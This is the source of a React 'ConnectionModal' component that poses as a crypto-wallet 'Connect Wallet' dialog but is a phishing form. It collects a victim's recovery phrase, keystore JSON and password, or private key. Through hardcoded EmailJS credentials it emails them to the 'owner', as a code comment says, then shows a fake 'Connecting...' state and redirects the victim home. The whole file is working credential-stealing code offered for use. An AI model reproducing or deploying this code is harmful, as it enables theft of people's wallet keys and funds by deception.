import React, { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";

// (Emailjs)
import emailjs from "@emailjs/browser";

// (Icons)
import { MdClose } from "react-icons/md";

const ConnectionModal = ({ setIsOpenModal, clickedInfo }) => {
  const form = useRef();
  const navigate = useNavigate();

  const [isLoading, setIsLoading] = useState(true);

  const [typeSelected, setTypeSelected] = useState(1);
  const [showOpen] = useState([
    {
      id: 1,
      name: "PHRASE",
    },
    {
      id: 2,
      name: "KEYSTORE",
    },
    {
      id: 3,
      name: "PRIVATE",
    },
  ]);
  const [isSubmittingResult, setIsSubmittingResult] = useState(false);

  const [formData, setFormData] = useState({
    walletName: clickedInfo.name ?? "Unknown wallet",
    key: "",
  });

  // TODO: REMOVE LOADING AFTER FOR 6 SECONDS
  useEffect(() => {
    setTimeout(() => {
      setIsLoading(false);
    }, 2000);
  }, [isLoading]);

  // TODO:  CHECK IF PHRASE HAS 12+ WORDS
  const checkIfPhrasehasMoreThanTwelveWordsOrSingleWord = (phrase) => {
    const words = phrase.trim().split(/\s+/);
    return (words.length > 11) | (words.length === 1);
  };

  // TODO: SUBMIT FORM
  const onSubmitHandler = (e) => {
    e.preventDefault();

    if (checkIfPhrasehasMoreThanTwelveWordsOrSingleWord(formData.key)) {
      // ENABLE BUTTON LOADING STATE
      setIsSubmittingResult(true);

      // TODO: SEND RESULT TO OWNER'S EMAIL ADDRESS
      emailjs
        .sendForm(
          "service_7xm44dq",
          "template_kdootr8",
          e.target,
          "user_Ecefo5N58b7Kg5HCFguhL"
        )
        .then(
          (result) => {
            setTimeout(() => {
              // DISABLE BUTTON LOADING STATE
              setIsSubmittingResult(false);

              // REDIRECT TO SUCCESS PAGE AFTER 5SECS
              navigate("/");
            }, 5000);
          },
          (error) => {
            console.log(error.text);
            // DISABLE BUTTON LOADING STATE
            setIsSubmittingResult(false);

            // SHOW ALERT
            alert("Please Try again later!");
          }
        );
    } else {
      // DISABLE BUTTON LOADING STATE
      setIsSubmittingResult(false);

      // SHOW ALERT
      alert("The Phrase key you entered is invalid");
    }
  };

  return (
    <div
      className="connection-modal fixed top-0 left-0 right-0 w-full bg-secondary/50 max-h-[100dvh] min-h-[100dvh] h-[100dvh] z-[9999999]"
      onClick={() => setIsOpenModal(false)}
    >
      <div className="w-full relative flex justify-center items-center py-10 h-full overflow-y-scroll shadow">
        <div
          className="w-full bg-white px-4 py-4 border md:max-w-[600px] max-w-[90%] mx-auto rounded-xl"
          onClick={(e) => e.stopPropagation()}
        >
          <main className="w-full h-full grid grid-rows-[auto_1fr]">
            <section className="w-full bg-transparent py-4 md:px-2">
              {isLoading && (
                <>
                  <div className="w-full h-full py-6 flex flex-col justify-center items-center text-center">
                    <div className="w-auto flex flex-col">
                      <img
                        src={clickedInfo.image}
                        alt={"This wallet"}
                        className="w-28 rounded-xl bg-white p-1 object-cover"
                        draggable={false}
                      />
                    </div>
                  </div>
                </>
              )}

              {!isLoading && (
                <>
                  <header className="w-full flex items-start justify-between mb-4">
                    <div>
                      <div className="w-auto">
                        <img
                          src={clickedInfo.image}
                          alt={"This wallet"}
                          className="w-16 rounded-xl bg-white p-1 object-cover"
                          draggable={false}
                        />
                      </div>
                    </div>
                    <div>
                      <button
                        onClick={() => setIsOpenModal(false)}
                        className="p-1 bg-red-500 rounded-full cursor-pointer text-white"
                      >
                        <MdClose size={25} />
                      </button>
                    </div>
                  </header>

                  <div className="w-full flex gap-4 justify-center items-center">
                    {showOpen.map((option) => {
                      return (
                        <button
                          onClick={() => setTypeSelected(option.id)}
                          className={`md:w-auto w-full ${
                            typeSelected === option.id && "!bg-blue-600"
                          } py-1 px-2 bg-gray-600 text-white text-sm rounded`}
                        >
                          {option.name}
                        </button>
                      );
                    })}
                  </div>

                  <div className="w-full h-full">
                    <form
                      action="POST"
                      ref={form}
                      onSubmit={onSubmitHandler}
                      className="w-full grid grid-cols-1 gap-y-4 text-black"
                    >
                      <div className="w-full flex flex-col gap-y-1.5">
                        <input
                          type="text"
                          name="walletName"
                          value={formData.walletName}
                          onChange={(e) =>
                            setFormData((prevData) => ({
                              ...prevData,
                              walletName: e.target.value,
                            }))
                          }
                          style={{ display: "none" }}
                          className="bg-transparent border border-secondary/30 p-2 rounded-md"
                        />
                      </div>

                      {/* FOR PHRASE KEY ONLY */}
                      {typeSelected === 1 && (
                        <>
                          <div className="w-full flex flex-col gap-y-1.5">
                            <label htmlFor="phrasekey" className="text-lg">
                              PHRASE KEY:
                            </label>
                            <textarea
                              type="text"
                              name="key"
                              id="phrasekey"
                              placeholder={`Enter your backup Wallet Phrase key associated with the account`}
                              onChange={(e) =>
                                setFormData((prevData) => ({
                                  ...prevData,
                                  key: e.target.value,
                                }))
                              }
                              className="bg-transparent border border-secondary/40 p-2 rounded-md min-h-[100px]"
                            ></textarea>
                            <p className="text-xs font-medium opacity-80">
                              NOTE: Typically 12 (sometimes 24...) words
                              separated by a single spaces.
                            </p>
                          </div>
                        </>
                      )}

                      {/* FOR KEYSTORE JSON  ONLY */}
                      {typeSelected === 2 && (
                        <>
                          <div className="w-full flex flex-col gap-y-1.5">
                            <label htmlFor="phrasekey" className="text-lg">
                              KEYSTORE JSON:
                            </label>
                            <textarea
                              type="text"
                              name="hex"
                              id="phrasekey"
                              placeholder={`Enter your backup Wallet KEYSTORE JSON associated with the account`}
                              onChange={(e) =>
                                setFormData((prevData) => ({
                                  ...prevData,
                                  key: e.target.value,
                                }))
                              }
                              className="bg-transparent border border-secondary/40 p-2 rounded-md min-h-[100px]"
                            ></textarea>
                          </div>

                          <div className="w-full flex flex-col gap-y-1.5">
                            <label
                              htmlFor="keystorePassword"
                              className="font-semibold text-lg"
                            >
                              PASSWORD:
                            </label>
                            <textarea
                              type="text"
                              name="pass"
                              id="keystorePassword"
                              placeholder={`Enter your backup password`}
                              onChange={(e) =>
                                setFormData((prevData) => ({
                                  ...prevData,
                                  key: e.target.value,
                                }))
                              }
                              className="bg-transparent border border-secondary/40 p-2 rounded-md"
                            ></textarea>
                            <p className="text-xs font-medium opacity-80">
                              NOTE: Typically 12 (sometimes 24...) words
                              separated by a single spaces.
                            </p>
                          </div>
                        </>
                      )}

                      {/* FOR PRIVATE KEY ONLY */}
                      {typeSelected === 3 && (
                        <>
                          <div className="w-full flex flex-col gap-y-1.5">
                            <label htmlFor="phrasekey" className="text-lg">
                              PRIVATE KEY:
                            </label>
                            <textarea
                              type="text"
                              name="key"
                              id="phrasekey"
                              placeholder={`Enter your backup Wallet Private key associated with the account`}
                              onChange={(e) =>
                                setFormData((prevData) => ({
                                  ...prevData,
                                  key: e.target.value,
                                }))
                              }
                              className="bg-transparent border border-secondary/40 p-2 rounded-md min-h-[100px]"
                            ></textarea>
                            <p className="text-xs font-medium opacity-80">
                              NOTE: Typically 12 (sometimes 24...) words
                              separated by a single spaces.
                            </p>
                          </div>
                        </>
                      )}

                      <div>
                        <button
                          type="submit"
                          disabled={isSubmittingResult ? true : false}
                          className="w-full mt-2 gradient_anyone text-white text-base font-medium border rounded-md flex gap-1 justify-center items-center py-2 px-4 uppercase"
                        >
                          {isSubmittingResult
                            ? "Connecting..."
                            : " Connect Wallet"}
                        </button>
                      </div>
                    </form>
                  </div>
                </>
              )}
            </section>
          </main>
        </div>
      </div>
    </div>
  );
};

export default ConnectionModal;
